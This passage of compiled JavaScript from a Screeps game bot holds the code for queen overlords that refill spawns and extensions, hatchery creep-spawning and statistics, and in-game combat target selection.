                    queen.task = Tasks.transfer(this.hatchery.battery);
                }
            }
            else {
                if (queen.carry.energy < queen.carryCapacity) { // make sure you're recharged
                    if (!this.hatchery.link.isEmpty) {
                        queen.task = Tasks.withdraw(this.hatchery.link);
                    }
                    else if (this.hatchery.battery && !this.hatchery.battery.isEmpty) {
                        queen.task = Tasks.withdraw(this.hatchery.battery);
                    }
                }
            }
        }
        else {
            if (this.hatchery.battery && queen.carry.energy < queen.carryCapacity) {
                queen.task = Tasks.withdraw(this.hatchery.battery);
            }
        }
    }
    handleQueen(queen) {
        if (queen.carry.energy > 0) {
            this.supplyActions(queen);
        }
        else {
            this.rechargeActions(queen);
        }
        // If there aren't any tasks that need to be done, recharge the battery from link
        if (queen.isIdle) {
            this.idleActions(queen);
        }
        // // If all of the above is done and hatchery is not in emergencyMode, move to the idle point and renew as needed
        // if (!this.emergencyMode && queen.isIdle) {
        //  if (queen.pos.isEqualTo(this.idlePos)) {
        //      // If queen is at idle position, renew her as needed
        //      if (queen.ticksToLive < this.settings.renewQueenAt && this.availableSpawns.length > 0) {
        //          this.availableSpawns[0].renewCreep(queen.creep);
        //      }
        //  } else {
        //      // Otherwise, travel back to idle position
        //      queen.goTo(this.idlePos);
        //  }
        // }
    }
    run() {
        for (const queen of this.queens) {
            // Get a task
            this.handleQueen(queen);
            // Run the task if you have one; else move back to idle pos
            if (queen.hasValidTask) {
                queen.run();
            }
            else {
                if (this.queens.length > 1) {
                    queen.goTo(this.hatchery.idlePos, { range: 1 });
                }
                else {
                    queen.goTo(this.hatchery.idlePos);
                }
            }
        }
    }
};
QueenOverlord = __decorate([
    profile
], QueenOverlord);

function isSupplyStructure(structure) {
    return structure.structureType == STRUCTURE_EXTENSION
        || structure.structureType == STRUCTURE_LAB
        || structure.structureType == STRUCTURE_TOWER
        || structure.structureType == STRUCTURE_SPAWN;
}
function computeQuadrant(colony, quadrant) {
    const positions = _.map(quadrant, coord => getPosFromBunkerCoord(coord, colony));
    const structures = [];
    for (const pos of positions) {
        const structure = _.find(pos.lookFor(LOOK_STRUCTURES), s => isSupplyStructure(s));
        if (structure) {
            structures.push(structure);
        }
    }
    return structures;
}
/**
 * A modified version of the queen overlord which contains a number of hard-coded optimization for bunker-type rooms.
 * This overlord supercedes the default queen overlord once the colony has a storage with a minimum amount of energy.
 */
let BunkerQueenOverlord = class BunkerQueenOverlord extends Overlord {
    constructor(hatchery, priority = OverlordPriority.core.queen) {
        super(hatchery, 'supply', priority);
        this.queenSetup = Setups.queens.default;
        this.queens = this.zerg(Roles.queen);
        this.batteries = _.filter(this.room.containers, container => insideBunkerBounds(container.pos, this.colony));
        this.storeStructures = _.compact([this.colony.terminal, this.colony.storage, ...this.batteries]);
        this.quadrants = {
            lowerRight: $.structures(this, 'LR', () => computeQuadrant(this.colony, quadrantFillOrder.lowerRight)),
            upperLeft: $.structures(this, 'UL', () => computeQuadrant(this.colony, quadrantFillOrder.upperLeft)),
            lowerLeft: $.structures(this, 'LL', () => computeQuadrant(this.colony, quadrantFillOrder.lowerLeft)),
            upperRight: $.structures(this, 'UR', () => computeQuadrant(this.colony, quadrantFillOrder.upperRight)),
        };
        this.computeQueenAssignments();
    }
    computeQueenAssignments() {
        // Assign quadrants to queens
        this.assignments = _.zipObject(_.map(this.queens, queen => [queen.name, {}]));
        const activeQueens = _.filter(this.queens, queen => !queen.spawning);
        this.numActiveQueens = activeQueens.length;
        if (this.numActiveQueens > 0) {
            const quadrantAssignmentOrder = [this.quadrants.lowerRight,
                this.quadrants.upperLeft,
                this.quadrants.lowerLeft,
                this.quadrants.upperRight];
            let i = 0;
            for (const quadrant of quadrantAssignmentOrder) {
                const queen = activeQueens[i % activeQueens.length];
                _.extend(this.assignments[queen.name], _.zipObject(_.map(quadrant, s => [s.id, true])));
                i++;
            }
        }
    }
    refresh() {
        super.refresh();
        $.refresh(this, 'batteries', 'storeStructures');
        $.refreshObject(this, 'quadrants');
        // Re-compute queen assignments if the number of queens has changed
        if (_.filter(this.queens, queen => !queen.spawning).length != this.numActiveQueens) {
            this.computeQueenAssignments();
        }
    }
    init() {
        for (const battery of this.batteries) {
            if (hasMinerals(battery.store)) { // get rid of any minerals in the container if present
                this.colony.logisticsNetwork.requestOutputMinerals(battery);
            }
        }
        // const amount = this.colony.spawns.length > 1 ? 2 : 1;
        const amount = this.colony.room.energyCapacityAvailable > 2000 ? 2 : 1;
        this.wishlist(amount, this.queenSetup);
    }
    // Builds a series of tasks to empty unnecessary carry contents, withdraw required resources, and supply structures
    buildSupplyTaskManifest(queen) {
        let tasks = [];
        // Step 1: empty all contents (this shouldn't be necessary since queen is normally empty at this point)
        let queenPos = queen.pos;
        if (_.sum(queen.carry) > 0) {
            const transferTarget = this.colony.terminal || this.colony.storage || this.batteries[0];
            if (transferTarget) {
                tasks.push(Tasks.transferAll(transferTarget));
                queenPos = transferTarget.pos;
            }
            else {
                log.warning(`No transfer targets for ${queen.print}!`);
                return null;
            }
        }
        // Step 2: figure out what you need to supply for and calculate the needed resources
        const queenCarry = {};
        const allStore = mergeSum(_.map(this.storeStructures, s => s.store));
        const supplyRequests = [];
        for (const priority in this.colony.transportRequests.supply) {
            for (const request of this.colony.transportRequests.supply[priority]) {
                if (this.assignments[queen.name][request.target.id]) {
                    supplyRequests.push(request);
                }
            }
        }
        const supplyTasks = [];
        for (const request of supplyRequests) {
            // stop when carry will be full
            const remainingAmount = queen.carryCapacity - _.sum(queenCarry);
            if (remainingAmount == 0)
                break;
            // figure out how much you can withdraw
            let amount = Math.min(request.amount, remainingAmount);
            amount = Math.min(amount, allStore[request.resourceType] || 0);
            if (amount == 0)
                continue;
            // update the simulated carry
            if (!queenCarry[request.resourceType]) {
                queenCarry[request.resourceType] = 0;
            }
            queenCarry[request.resourceType] += amount;
            // add a task to supply the target
            supplyTasks.push(Tasks.transfer(request.target, request.resourceType, amount));
        }
        // Step 3: make withdraw tasks to get the needed resources
        const withdrawTasks = [];
        const neededResources = _.keys(queenCarry);
        // TODO: a single structure doesn't need to have all resources; causes jam if labs need supply but no minerals
        const targets = _.filter(this.storeStructures, s => _.all(neededResources, resource => (s.store[resource] || 0) >= (queenCarry[resource] || 0)));
        const withdrawTarget = minBy(targets, target => Pathing.distance(queenPos, target.pos));
        if (!withdrawTarget) {
            log.warning(`Could not find adequate withdraw structure for ${queen.print}! ` +
                `(neededResources: ${neededResources}, queenCarry: ${queenCarry})`);
            return null;
        }
        for (const resourceType of neededResources) {
            withdrawTasks.push(Tasks.withdraw(withdrawTarget, resourceType, queenCarry[resourceType]));
        }
        // Step 4: put all the tasks in the correct order, set nextPos for each, and chain them together
        tasks = tasks.concat(withdrawTasks, supplyTasks);
        return Tasks.chain(tasks);
    }
    // Builds a series of tasks to withdraw required resources from targets
    buildWithdrawTaskManifest(queen) {
        const tasks = [];
        const transferTarget = this.colony.terminal || this.colony.storage || this.batteries[0];
        // Step 1: empty all contents (this shouldn't be necessary since queen is normally empty at this point)
        if (_.sum(queen.carry) > 0) {
            if (transferTarget) {
                tasks.push(Tasks.transferAll(transferTarget));
            }
            else {
                log.warning(`No transfer targets for ${queen.print}!`);
                return null;
            }
        }
        // Step 2: figure out what you need to withdraw from
        const queenCarry = { energy: 0 };
        // let allWithdrawRequests = _.compact(_.flatten(_.map(this.assignments[queen.name],
        //                                                  struc => this.transportRequests.withdrawByID[struc.id])));
        const withdrawRequests = [];
        for (const priority in this.colony.transportRequests.withdraw) {
            for (const request of this.colony.transportRequests.withdraw[priority]) {
                if (this.assignments[queen.name][request.target.id]) {
                    withdrawRequests.push(request);
                }
            }
        }
        for (const request of withdrawRequests) {
            // stop when carry will be full
            const remainingAmount = queen.carryCapacity - _.sum(queenCarry);
            if (remainingAmount == 0)
                break;
            // figure out how much you can withdraw
            const amount = Math.min(request.amount, remainingAmount);
            if (amount == 0)
                continue;
            // update the simulated carry
            if (!queenCarry[request.resourceType]) {
                queenCarry[request.resourceType] = 0;
            }
            queenCarry[request.resourceType] += amount;
            // add a task to supply the target
            tasks.push(Tasks.withdraw(request.target, request.resourceType, amount));
        }
        // Step 3: put stuff in terminal/storage
        if (transferTarget) {
            tasks.push(Tasks.transferAll(transferTarget));
        }
        else {
            log.warning(`No transfer targets for ${queen.print}!`);
            return null;
        }
        // Step 4: return chained task manifest
        return Tasks.chain(tasks);
    }
    // private getChargingSpot(queen: Zerg): RoomPosition {
    //  let chargeSpots = _.map(bunkerChargingSpots, coord => getPosFromBunkerCoord(coord, this.colony));
    //  let chargeSpot = (_.first(this.assignments[queen.name]) || queen).pos.findClosestByRange(chargeSpots);
    //  if (chargeSpot) {
    //      return chargeSpot;
    //  } else {
    //      log.warning(`Could not determine charging spot for queen at ${queen.pos.print}!`);
    //      return queen.pos;
    //  }
    // }
    //
    // private idleActions(queen: Zerg): void {
    //
    //  // // Refill any empty batteries
    //  // for (let battery of this.batteries) {
    //  //  if (!battery.isFull) {
    //  //      let amount = Math.min(battery.storeCapacity - _.sum(battery.store), queen.carryCapacity);
    //  //      let target = this.colony.storage || this.colony.storage;
    //  //      if (target) {
    //  //          queen.task = Tasks.transfer(battery, RESOURCE_ENERGY, amount)
    //  //                            .fork(Tasks.withdraw(target, RESOURCE_ENERGY, amount))
    //  //          return;
    //  //      }
    //  //  }
    //  // }
    //
    //  // Go to recharging spot and get recharged
    //  let chargingSpot = this.getChargingSpot(queen);
    //  queen.goTo(chargingSpot, {range: 0});
    //  // // TODO: this will cause oscillating behavior where recharge drains some energy and queen leaves to supply it
    //  // if (queen.pos.getRangeTo(chargingSpot) == 0) {
    //  //  let chargingSpawn = _.first(queen.pos.findInRange(this.colony.spawns, 1));
    //  //  if (chargingSpawn && !chargingSpawn.spawning) {
    //  //      chargingSpawn.renewCreep(queen.creep);
    //  //  }
    //  // }
    // }
    handleQueen(queen) {
        // Does something need withdrawing?
        if (this.colony.transportRequests.needsWithdrawing &&
            _.any(_.keys(this.assignments[queen.name]), id => this.colony.transportRequests.withdrawByID[id])) {
            queen.task = this.buildWithdrawTaskManifest(queen);
        }
        // Does something need supplying?
        else if (this.colony.transportRequests.needsSupplying &&
            _.any(_.keys(this.assignments[queen.name]), id => this.colony.transportRequests.supplyByID[id])) {
            queen.task = this.buildSupplyTaskManifest(queen);
        }
        // Otherwise do idle actions
        if (queen.isIdle) {
            // this.idleActions(queen);
            delete queen.memory._go;
        }
    }
    run() {
        this.autoRun(this.queens, queen => this.handleQueen(queen));
    }
};
BunkerQueenOverlord = __decorate([
    profile
], BunkerQueenOverlord);

const ERR_ROOM_ENERGY_CAPACITY_NOT_ENOUGH = -20;
const ERR_SPECIFIED_SPAWN_BUSY = -21;
const HatcheryMemoryDefaults = {
    stats: {
        overload: 0,
        uptime: 0,
        longUptime: 0,
    }
};
/**
 * The hatchery encompasses all spawning-related structures, like spawns, extensions, and some energy buffer containers,
 * and contains logic for spawning the creeps requested by overlords
 */
let Hatchery = class Hatchery extends HiveCluster {
    constructor(colony, headSpawn) {
        super(colony, headSpawn, 'hatchery');
        // Register structure components
        this.memory = Mem.wrap(this.colony.memory, 'hatchery', HatcheryMemoryDefaults, true);
        if (this.colony.layout == 'twoPart')
            this.colony.destinations.push({ pos: this.pos, order: -1 });
        this.spawns = colony.spawns;
        this.availableSpawns = _.filter(this.spawns, spawn => !spawn.spawning);
        this.extensions = colony.extensions;
        this.towers = colony.commandCenter ? _.difference(colony.towers, colony.commandCenter.towers) : colony.towers;
        if (this.colony.layout == 'bunker') {
            this.battery = _.first(_.filter(this.room.containers, cont => insideBunkerBounds(cont.pos, this.colony)));
            $.set(this, 'energyStructures', () => this.computeEnergyStructures());
        }
        else {
            this.link = this.pos.findClosestByLimitedRange(colony.availableLinks, 2);
            this.colony.linkNetwork.claimLink(this.link);
            this.battery = this.pos.findClosestByLimitedRange(this.room.containers, 2);
            this.energyStructures = [].concat(this.spawns, this.extensions);
        }
        this.productionPriorities = [];
        this.productionQueue = {};
        this.isOverloaded = false;
        this.settings = {
            refillTowersBelow: 750,
            linksRequestEnergyBelow: 0,
            suppressSpawning: false,
        };
        this.transportRequests = colony.transportRequests; // hatchery always uses colony transport group
    }
    refresh() {
        this.memory = Mem.wrap(this.colony.memory, 'hatchery', HatcheryMemoryDefaults, true);
        $.refreshRoom(this);
        $.refresh(this, 'spawns', 'extensions', 'energyStructures', 'link', 'towers', 'battery');
        this.availableSpawns = _.filter(this.spawns, spawn => !spawn.spawning);
        this.isOverloaded = false;
        this.productionPriorities = [];
        this.productionQueue = {};
    }
    spawnMoarOverlords() {
        if (this.colony.layout == 'bunker' && (this.colony.storage || this.colony.terminal)
            && this.colony.assets[RESOURCE_ENERGY] > 10000) {
            this.overlord = new BunkerQueenOverlord(this); // use bunker queen if has storage and enough energy
        }
        else {
            this.overlord = new QueenOverlord(this);
        }
    }
    // Idle position for queen
    get idlePos() {
        if (this.battery) {
            return this.battery.pos;
        }
        else {
            return this.spawns[0].pos.availableNeighbors(true)[0];
        }
    }
    computeEnergyStructures() {
        if (this.colony.layout == 'bunker') {
            const positions = _.map(energyStructureOrder, coord => getPosFromBunkerCoord(coord, this.colony));
            let spawnsAndExtensions = [];
            spawnsAndExtensions = spawnsAndExtensions.concat(this.spawns, this.extensions);
            const energyStructures = [];
            for (const pos of positions) {
                const structure = _.find(pos.lookFor(LOOK_STRUCTURES), s => s.structureType == STRUCTURE_SPAWN
                    || s.structureType == STRUCTURE_EXTENSION);
                if (structure) {
                    energyStructures.push(_.remove(spawnsAndExtensions, s => s.id == structure.id)[0]);
                }
            }
            return _.compact(energyStructures.concat(spawnsAndExtensions));
        }
        else {
            // Ugly workaround to [].concat() throwing a temper tantrum
            let spawnsAndExtensions = [];
            spawnsAndExtensions = spawnsAndExtensions.concat(this.spawns, this.extensions);
            return _.sortBy(spawnsAndExtensions, structure => structure.pos.getRangeTo(this.idlePos));
        }
    }
    /* Request more energy when appropriate either via link or hauler */
    registerEnergyRequests() {
        // Register requests for input into the hatchery (goes on colony store group)
        if (this.link && this.link.isEmpty) {
            this.colony.linkNetwork.requestReceive(this.link);
        }
        if (this.battery) {
            const threshold = this.colony.stage == ColonyStage.Larva ? 0.75 : 0.5;
            if (this.battery.energy < threshold * this.battery.storeCapacity) {
                this.colony.logisticsNetwork.requestInput(this.battery, { multiplier: 1.5 });
            }
            // get rid of any minerals in the container if present
            if (hasMinerals(this.battery.store)) {
                this.colony.logisticsNetwork.requestOutputMinerals(this.battery);
            }
        }
        // Register energy transport requests (goes on hatchery store group, which can be colony store group)
        // let refillStructures = this.energyStructures;
        // if (this.colony.defcon > DEFCON.safe) {
        //  for (let hostile of this.room.dangerousHostiles) {
        //      // TODO: remove tranport requests if blocked by enemies
        //  }
        // }
        // if (this.room.defcon > 0) {refillStructures = _.filter()}
        _.forEach(this.energyStructures, struct => this.transportRequests.requestInput(struct, Priority.NormalLow));
        // let refillSpawns = _.filter(this.spawns, spawn => spawn.energy < spawn.energyCapacity);
        // let refillExtensions = _.filter(this.extensions, extension => extension.energy < extension.energyCapacity);
        const refillTowers = _.filter(this.towers, tower => tower.energy < this.settings.refillTowersBelow);
        // _.forEach(refillSpawns, spawn => this.transportRequests.requestInput(spawn, Priority.NormalLow));
        // _.forEach(refillExtensions, extension => this.transportRequests.requestInput(extension, Priority.NormalLow));
        _.forEach(refillTowers, tower => this.transportRequests.requestInput(tower, Priority.NormalLow));
    }
    // Creep queueing and spawning =====================================================================================
    generateCreepName(roleName) {
        // Generate a creep name based on the role and add a suffix to make it unique
        let i = 0;
        while (Game.creeps[(roleName + '_' + i)]) {
            i++;
        }
        return (roleName + '_' + i);
    }
    spawnCreep(protoCreep, options = {}) {
        // get a spawn to use
        let spawnToUse;
        if (options.spawn) {
            spawnToUse = options.spawn;
            if (spawnToUse.spawning) {
                return ERR_SPECIFIED_SPAWN_BUSY;
            }
            else {
                _.remove(this.availableSpawns, spawn => spawn.id == spawnToUse.id); // mark as used
            }
        }
        else {
            spawnToUse = this.availableSpawns.shift();
        }
        if (spawnToUse) { // if there is a spawn, create the creep
            if (this.colony.bunker && this.colony.bunker.coreSpawn
                && spawnToUse.id == this.colony.bunker.coreSpawn.id && !options.directions) {
                options.directions = [TOP, RIGHT]; // don't spawn into the manager spot
            }
            protoCreep.name = this.generateCreepName(protoCreep.name); // modify the creep name to make it unique
            if (bodyCost(protoCreep.body) > this.room.energyCapacityAvailable) {
                return ERR_ROOM_ENERGY_CAPACITY_NOT_ENOUGH;
            }
            protoCreep.memory.data.origin = spawnToUse.pos.roomName;
            const result = spawnToUse.spawnCreep(protoCreep.body, protoCreep.name, {
                memory: protoCreep.memory,
                energyStructures: this.energyStructures,
                directions: options.directions
            });
            if (result == OK) {
                return result;
            }
            else {
                this.availableSpawns.unshift(spawnToUse); // return the spawn to the available spawns list
                return result;
            }
        }
        else { // otherwise, return busy
            return ERR_BUSY;
        }
    }
    canSpawn(body) {
        return bodyCost(body) <= this.room.energyCapacityAvailable;
    }
    canSpawnZerg(zerg) {
        return this.canSpawn(_.map(zerg.body, part => part.type));
    }
    /* Generate (but not spawn) the largest creep possible, returns the protoCreep as an object */
    generateProtoCreep(setup, overlord) {
        // Generate the creep body
        let creepBody;
        // if (overlord.colony.incubator) { // if you're being incubated, build as big a creep as you want
        //  creepBody = setup.generateBody(overlord.colony.incubator.room.energyCapacityAvailable);
        // } else { // otherwise limit yourself to actual energy constraints
        creepBody = setup.generateBody(this.room.energyCapacityAvailable);
        // }
        // Generate the creep memory
        const creepMemory = {
            ["C" /* COLONY */]: overlord.colony.name,
            ["O" /* OVERLORD */]: overlord.ref,
            role: setup.role,
            task: null,
            data: {
                origin: '',
            },
        };
        // Create the protocreep and return it
        const protoCreep = {
            body: creepBody,
            name: setup.role,
            memory: creepMemory,
        };
        return protoCreep;
    }
    /* Returns the approximate aggregated time at which the hatchery will next be available to spawn something */
    get nextAvailability() {
        if (!this._nextAvailability) {
            const allQueued = _.flatten(_.values(this.productionQueue));
            const queuedSpawnTime = _.sum(allQueued, order => order.protoCreep.body.length) * CREEP_SPAWN_TIME;
            const activeSpawnTime = _.sum(this.spawns, spawn => spawn.spawning ? spawn.spawning.remainingTime : 0);
            this._nextAvailability = (activeSpawnTime + queuedSpawnTime) / this.spawns.length;
        }
        return this._nextAvailability;
    }
    // /* Number of ticks required to make everything in spawn queue divided by number of spawns */
    // get queuedSpawnTime(): number {
    //  if (!this._queuedSpawnTime) {
    //      let allQueued = _.flatten(_.values(this.productionQueue)) as SpawnOrder[];
    //      let queuedSpawnTime = _.sum(allQueued, order => order.protoCreep.body.length) * CREEP_SPAWN_TIME;
    //      this._queuedSpawnTime = queuedSpawnTime / this.spawns.length;
    //  }
    //  return this._queuedSpawnTime;
    // }
    /* Enqueues a request to the hatchery */
    enqueue(request) {
        const protoCreep = this.generateProtoCreep(request.setup, request.overlord);
        const priority = request.priority;
        if (this.canSpawn(protoCreep.body) && protoCreep.body.length > 0) {
            // Spawn the creep yourself if you can
            this._nextAvailability = undefined; // invalidate cache
            // this._queuedSpawnTime = undefined;
            if (!this.productionQueue[priority]) {
                this.productionQueue[priority] = [];
                this.productionPriorities.push(priority); // this is necessary because keys interpret number as string
            }
            this.productionQueue[priority].push({ protoCreep: protoCreep, options: request.options });
        }
        else {
            log.debug(`${this.room.print}: cannot spawn creep ${protoCreep.name} with body ` +
                `${JSON.stringify(protoCreep.body)}!`);
        }
    }
    spawnHighestPriorityCreep() {
        const sortedKeys = _.sortBy(this.productionPriorities);
        for (const priority of sortedKeys) {
            // if (this.colony.defcon >= DEFCON.playerInvasion
            //  && !this.colony.controller.safeMode
            //  && priority > OverlordPriority.warSpawnCutoff) {
            //  continue; // don't spawn non-critical creeps during wartime
            // }
            const nextOrder = this.productionQueue[priority].shift();
            if (nextOrder) {
                const { protoCreep, options } = nextOrder;
                const result = this.spawnCreep(protoCreep, options);
                if (result == OK) {
                    return result;
                }
                else if (result == ERR_SPECIFIED_SPAWN_BUSY) {
                    return result; // continue to spawn other things while waiting on specified spawn
                }
                else {
                    // If there's not enough energyCapacity to spawn, ignore it and move on, otherwise block and wait
                    if (result != ERR_ROOM_ENERGY_CAPACITY_NOT_ENOUGH) {
                        this.productionQueue[priority].unshift(nextOrder);
                        return result;
                    }
                }
            }
        }
    }
    handleSpawns() {
        // Spawn all queued creeps that you can
        while (this.availableSpawns.length > 0) {
            const result = this.spawnHighestPriorityCreep();
            if (result == ERR_NOT_ENOUGH_ENERGY) { // if you can't spawn something you want to
                this.isOverloaded = true;
            }
            if (result != OK && result != ERR_SPECIFIED_SPAWN_BUSY) {
                // Can't spawn creep right now
                break;
            }
        }
        // Move creeps off of exit position to let the spawning creep out if necessary
        for (const spawn of this.spawns) {
            if (spawn.spawning && spawn.spawning.remainingTime <= 1
                && spawn.pos.findInRange(FIND_MY_CREEPS, 1).length > 0) {
                let directions;
                if (spawn.spawning.directions) {
                    directions = spawn.spawning.directions;
                }
                else {
                    directions = _.map(spawn.pos.availableNeighbors(true), pos => spawn.pos.getDirectionTo(pos));
                }
                const exitPos = Pathing.positionAtDirection(spawn.pos, _.first(directions));
                Movement.vacatePos(exitPos);
            }
        }
    }
    // Runtime operation ===============================================================================================
    init() {
        this.registerEnergyRequests();
    }
    run() {
        if (!this.settings.suppressSpawning) {
            this.handleSpawns();
        }
        this.recordStats();
    }
    recordStats() {
        // Compute uptime and overload status
        const spawnUsageThisTick = _.filter(this.spawns, spawn => spawn.spawning).length / this.spawns.length;
        const uptime = exponentialMovingAverage(spawnUsageThisTick, this.memory.stats.uptime, CREEP_LIFE_TIME);
        const longUptime = exponentialMovingAverage(spawnUsageThisTick, this.memory.stats.longUptime, 5 * CREEP_LIFE_TIME);
        const overload = exponentialMovingAverage(this.isOverloaded ? 1 : 0, this.memory.stats.overload, CREEP_LIFE_TIME);
        Stats.log(`colonies.${this.colony.name}.hatchery.uptime`, uptime);
        Stats.log(`colonies.${this.colony.name}.hatchery.overload`, overload);
        this.memory.stats = { overload, uptime, longUptime };
    }
    visuals(coord) {
        let { x, y } = coord;
        const spawning = [];
        const spawnProgress = [];
        _.forEach(this.spawns, function (spawn) {
            if (spawn.spawning) {
                spawning.push(spawn.spawning.name.split('_')[0]);
                const timeElapsed = spawn.spawning.needTime - spawn.spawning.remainingTime;
                spawnProgress.push([timeElapsed, spawn.spawning.needTime]);
            }
        });
        const boxCoords = Visualizer.section(`${this.colony.name} Hatchery`, { x, y, roomName: this.room.name }, 9.5, 3 + spawning.length + .1);
        const boxX = boxCoords.x;
        y = boxCoords.y + 0.25;
        // Log energy
        Visualizer.text('Energy', { x: boxX, y: y, roomName: this.room.name });
        Visualizer.barGraph([this.room.energyAvailable, this.room.energyCapacityAvailable], { x: boxX + 4, y: y, roomName: this.room.name }, 5);
        y += 1;
        // Log uptime
        const uptime = this.memory.stats.uptime;
        Visualizer.text('Uptime', { x: boxX, y: y, roomName: this.room.name });
        Visualizer.barGraph(uptime, { x: boxX + 4, y: y, roomName: this.room.name }, 5);
        y += 1;
        // Log overload status
        const overload = this.memory.stats.overload;
        Visualizer.text('Overload', { x: boxX, y: y, roomName: this.room.name });
        Visualizer.barGraph(overload, { x: boxX + 4, y: y, roomName: this.room.name }, 5);
        y += 1;
        for (const i in spawning) {
            Visualizer.text(spawning[i], { x: boxX, y: y, roomName: this.room.name });
            Visualizer.barGraph(spawnProgress[i], { x: boxX + 4, y: y, roomName: this.room.name }, 5);
            y += 1;
        }
        return { x: x, y: y + .25 };
    }
};
Hatchery.restrictedRange = 6; // Don't stand idly within this range of hatchery
Hatchery = __decorate([
    profile
], Hatchery);

let CombatTargeting = class CombatTargeting {
    /**
     * Finds the best target within a given range that a zerg can currently attack
     */
    static findBestCreepTargetInRange(zerg, range, targets = zerg.room.hostiles) {
        const nearbyHostiles = _.filter(targets, c => zerg.pos.inRangeToXY(c.pos.x, c.pos.y, range));
        return maxBy(nearbyHostiles, function (hostile) {
            if (hostile.hitsPredicted == undefined)
                hostile.hitsPredicted = hostile.hits;
            if (hostile.pos.lookForStructure(STRUCTURE_RAMPART))
                return false;
            return hostile.hitsMax - hostile.hitsPredicted + CombatIntel.getHealPotential(hostile); // compute score
        });
    }
    /**
     * Finds the best target within a given range that a zerg can currently attack
     */
    static findBestStructureTargetInRange(zerg, range, allowUnowned = true) {
        let nearbyStructures = _.filter(zerg.room.hostileStructures, s => zerg.pos.inRangeToXY(s.pos.x, s.pos.y, range));
        // If no owned structures to attack and not in colony room or outpost, target unowned structures
        if (allowUnowned && nearbyStructures.length == 0 && !Overmind.colonyMap[zerg.room.name]) {
            nearbyStructures = _.filter(zerg.room.structures, s => zerg.pos.inRangeToXY(s.pos.x, s.pos.y, range));
        }
        return maxBy(nearbyStructures, function (structure) {
            let score = 10 * AttackStructureScores[structure.structureType];
            if (structure.pos.lookForStructure(STRUCTURE_RAMPART))
                score *= .1;
            return score;
        });
    }
    /**
     * Standard target-finding logic
     */
    static findTarget(zerg, targets = zerg.room.hostiles) {
        return maxBy(targets, function (hostile) {
            if (hostile.hitsPredicted == undefined)
                hostile.hitsPredicted = hostile.hits;
            if (hostile.pos.lookForStructure(STRUCTURE_RAMPART))
                return false;
            return hostile.hitsMax - hostile.hitsPredicted + CombatIntel.getHealPotential(hostile)
                - 10 * zerg.pos.getMultiRoomRangeTo(hostile.pos); // compute score
        });
    }
    /**
     * Finds the best target within a given range that a zerg can currently attack
     */
    static findBestCreepTargetForTowers(room, targets = room.hostiles) {
        return maxBy(targets, function (hostile) {
            if (hostile.hitsPredicted == undefined)
                hostile.hitsPredicted = hostile.hits;
            if (hostile.pos.lookForStructure(STRUCTURE_RAMPART))
                return false;
            return hostile.hitsMax - hostile.hitsPredicted
                + CombatIntel.getHealPotential(hostile) + (CombatIntel.towerDamageAtPos(hostile.pos) || 0);
        });
    }
    static findClosestHostile(zerg, checkReachable = false, ignoreCreepsAtEdge = true) {
        if (zerg.room.hostiles.length > 0) {
            let targets;
            if (ignoreCreepsAtEdge) {
                targets = _.filter(zerg.room.hostiles, hostile => hostile.pos.rangeToEdge > 0);
            }
            else {
                targets = zerg.room.hostiles;
            }
            if (checkReachable) {
                const targetsByRange = _.sortBy(targets, target => zerg.pos.getRangeTo(target));
                return _.find(targetsByRange, target => Pathing.isReachable(zerg.pos, target.pos, zerg.room.barriers));
            }
            else {
                return zerg.pos.findClosestByRange(targets);
            }
        }
    }
    // This method is expensive
    static findClosestReachable(pos, targets) {
        const targetsByRange = _.sortBy(targets, target => pos.getRangeTo(target));
        return _.find(targetsByRange, target => Pathing.isReachable(pos, target.pos, target.room.barriers));
    }
    static findClosestHurtFriendly(healer) {
        return healer.pos.findClosestByRange(_.filter(healer.room.creeps, creep => creep.hits < creep.hitsMax));
    }
    /**
     * Finds the best (friendly) target in range that a zerg can currently heal
     */
    static findBestHealingTargetInRange(healer, range = 3, friendlies = healer.room.creeps) {
        return maxBy(_.filter(friendlies, f => healer.pos.getRangeTo(f) <= range), friend => {
            if (friend.hitsPredicted == undefined)
                friend.hitsPredicted = friend.hits;
            const attackProbability = 0.5;
            for (const hostile of friend.pos.findInRange(friend.room.hostiles, 3)) {
                if (hostile.pos.isNearTo(friend)) {
                    friend.hitsPredicted -= attackProbability * CombatIntel.getAttackDamage(hostile);
                }
                else {
                    friend.hitsPredicted -= attackProbability * (CombatIntel.getAttackDamage(hostile)
                        + CombatIntel.getRangedAttackDamage(hostile));
                }
            }
            const healScore = friend.hitsMax - friend.hitsPredicted;
            if (healer.pos.getRangeTo(friend) > 1) {
                return healScore + CombatIntel.getRangedHealAmount(healer.creep);
            }
            else {
                return healScore + CombatIntel.getHealAmount(healer.creep);
            }
        });
    }
    static findClosestPrioritizedStructure(zerg, checkReachable = false) {
        for (const structureType of AttackStructurePriorities) {
            const structures = _.filter(zerg.room.hostileStructures, s => s.structureType == structureType);
            if (structures.length == 0)
                continue;
            if (checkReachable) {
                const closestReachable = this.findClosestReachable(zerg.pos, structures);
                if (closestReachable)
                    return closestReachable;
            }
            else {
                return zerg.pos.findClosestByRange(structures);
            }
        }
    }
    static findBestStructureTarget(pos) {
        const room = Game.rooms[pos.roomName];
        // Don't accidentally destroy your own shit
        if (!room || room.my || room.reservedByMe) {
            return;
        }
        // Look for any unprotected structures
        const unprotectedRepairables = _.filter(room.repairables, s => {
            const rampart = s.pos.lookForStructure(STRUCTURE_RAMPART);
            return !rampart || rampart.hits < 10000;
        });
        let approach = _.map(unprotectedRepairables, structure => {
            return { pos: structure.pos, range: 0 };
        });
        if (room.barriers.length == 0 && unprotectedRepairables.length == 0)
            return; // if there's nothing in the room
        // Try to find a reachable unprotected structure
        if (approach.length > 0) {
            const ret = PathFinder.search(pos, approach, {
                maxRooms: 1,
                maxOps: 2000,
                roomCallback: roomName => {
                    if (roomName != room.name)
                        return false;
                    const matrix = new PathFinder.CostMatrix();
                    for (const barrier of room.barriers) {
                        matrix.set(barrier.pos.x, barrier.pos.y, 0xff);
                    }
                    return matrix;
                },
            });
            const targetPos = _.last(ret.path);
            if (!ret.incomplete && targetPos) {
                const targetStructure = _.first(_.filter(targetPos.lookFor(LOOK_STRUCTURES), s => {
                    return s.structureType != STRUCTURE_ROAD && s.structureType != STRUCTURE_CONTAINER;
                }));
                if (targetStructure) {
                    log.debug(`Found unprotected structure target @ ${targetPos.print}`);
                    return targetStructure;
                }
            }
        }
        // Determine a "siege anchor" for what you eventually want to destroy
        let targets = room.spawns;
        if (targets.length == 0)
            targets = room.repairables;
        if (targets.length == 0)
            targets = room.barriers;
        if (targets.length == 0)
            targets = room.structures;
        if (targets.length == 0)
            return;
        // Recalculate approach targets
        approach = _.map(targets, s => {
            return { pos: s.pos, range: 0 };
        });
